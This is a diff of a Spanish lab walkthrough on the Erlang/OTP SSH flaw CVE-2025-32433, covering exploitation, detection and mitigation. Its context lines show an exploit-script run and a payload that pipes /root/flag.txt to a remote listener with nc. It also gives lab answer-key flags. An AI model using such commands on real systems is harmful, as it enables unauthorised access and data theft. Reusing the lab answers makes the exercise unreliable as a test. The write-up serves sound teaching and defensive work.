@@ -1,5 +1,5 @@
 
-# Erlang/OTP SSH: CVE-2025-32433
+# erlangotpsshcve202532433 [EASY]
 
 Aprende y explota la vulnerabilidad CVE-2025-32433 de Erlang/OTP SSH en un entorno de laboratorio.
 
@@ -14,7 +14,7 @@ Aprende y explota la vulnerabilidad CVE-2025-32433 de Erlang/OTP SSH en un entor
 > 
  
 
-## Tarea 1: Introducción
+## Tarea 1: Introducción / Task 1: Introduction
 
 Erlang y su framework complementario, el Open Telecom Platform (OTP), forman un ecosistema poderoso para construir sistemas distribuidos tolerantes a fallos. Erlang es un lenguaje de programación diseñado para construir sistemas escalables en tiempo real que requieren alta disponibilidad. Originalmente, Erlang fue desarrollado por Ericsson para sistemas de telecomunicaciones; sin embargo, ha evolucionado a lo largo de los años para convertirse en una solución para diversos desafíos de computación distribuida.
 
@@ -26,7 +26,7 @@ Erlang/OTP SSH es una implementación del protocolo SSH como parte de Erlang OTP
 
 ---
 
-## Tarea 2: Trasfondo Técnico y Explotación
+## Tarea 2: Trasfondo Técnico y Explotación / Task 2: Technical Background and Exploitation
 
 Esta vulnerabilidad existe debido a la implementación del protocolo SSH por parte de Erlang/OTP, particularmente debido al manejo de los mensajes del protocolo de conexión durante la fase de pre-autenticación. Según este resumen técnico ([https://www.upwind.io/feed/cve-2025-32433-critical-erlang-otp-ssh-vulnerability-cvss-10](https://www.upwind.io/feed/cve-2025-32433-critical-erlang-otp-ssh-vulnerability-cvss-10)), los números de mensaje SSH de 80 en adelante están reservados para la post-autenticación. En consecuencia, si el cliente SSH envía un mensaje SSH con tales números antes de que se complete la autenticación, el servidor SSH debería desconectarlos. Los servidores vulnerables no imponen esto, lo que da a los atacantes muchas ventanas para diseñar sus mensajes y finalmente lograr la ejecución de código no autorizada.
 
@@ -79,7 +79,7 @@ root@attackbox ~/CVE-2025-32433# python3 CVE-2025-32433.py
 
 ```
 
-### Confirmando la Vulnerabilidad
+### Confirmando la Vulnerabilidad / Confirming the Vulnerability
 
 Después de ejecutar el código del exploit anterior en la VM adjunta, nos gustaría confirmar que tuvo éxito. Esto sería trivial si tuviéramos acceso al sistema; sin embargo, para ejecutar las cosas desde la perspectiva del adversario, asumamos que no tenemos tal acceso. Necesitamos otras formas de comprobar si nuestro archivo se ha creado correctamente.
 
@@ -102,18 +102,15 @@ Por favor, recuerda añadir `.` al final de cada instrucción de Erlang. En otra
 * Payload: `cat /root/flag.txt | nc IP 4444`
 * **Respuesta:** `THM{U57U3P5KnR}`
 
-
 * **¿Cuál es el hostname del sistema?**
 * Usa `hostname`.
 * **Respuesta:** `c7b79fd068ba`
 
-
-
 ---
 
-## Tarea 3: Detección
+## Tarea 3: Detección / Task 3: Detection
 
-### Detección Basada en Red
+### Detección Basada en Red / Network-Based Detection
 
 El ataque se basa en una capa de implementación del protocolo SSH, por lo que los registros del demonio SSH no proporcionarían evidencia de explotación confiable. Aun así, el ataque puede ser rastreado revisando el tráfico de red, donde se vería el paquete "SSH_MSG_CHANNEL_REQUEST" viniendo de un atacante hacia tu servidor. El paquete contendrá un payload que comienza con la palabra clave "exec" y termina con el comando exacto a ser ejecutado en el objetivo en texto plano.
 
@@ -124,7 +121,7 @@ Los proveedores de firewalls están implementando gradualmente reglas NIDS/NIPS 
 * Regla IPS de FortiGate: [Sitio web de FortiGuard](https://www.fortiguard.com/encyclopedia/ips/57832)
 * Ejemplo de regla IPS para Suricata: [Repositorio de Github](https://github.com/darses/CVE-2025-32433/blob/main/suricata.rules)
 
-### Detección Basada en Host
+### Detección Basada en Host / Host-Based Detection
 
 Además del enfoque NIDS/NIPS, el ataque puede ser detectado en etapas posteriores. Dado que la vulnerabilidad afecta principalmente a dispositivos de red que suelen controlar una red o uno de sus segmentos, los atacantes pueden usar los dispositivos explotados como punto de partida para entrar en tu Active Directory, entorno de producción u otro segmento de red sensible.
 
@@ -141,7 +138,7 @@ Además del enfoque NIDS/NIPS, el ataque puede ser detectado en etapas posterior
 
 ---
 
-## Tarea 4: Mitigación
+## Tarea 4: Mitigación / Task 4: Mitigation
 
 Muchos productos de hardware y software utilizan Erlang/OTP; desafortunadamente, algunos de estos productos tienen su SSH expuesto al mundo exterior. Debes confirmar si el SSH está habilitado en tus productos y si se ve afectado. Las versiones de OTP afectadas por esta vulnerabilidad son todas las versiones anteriores e incluyendo las siguientes:
 
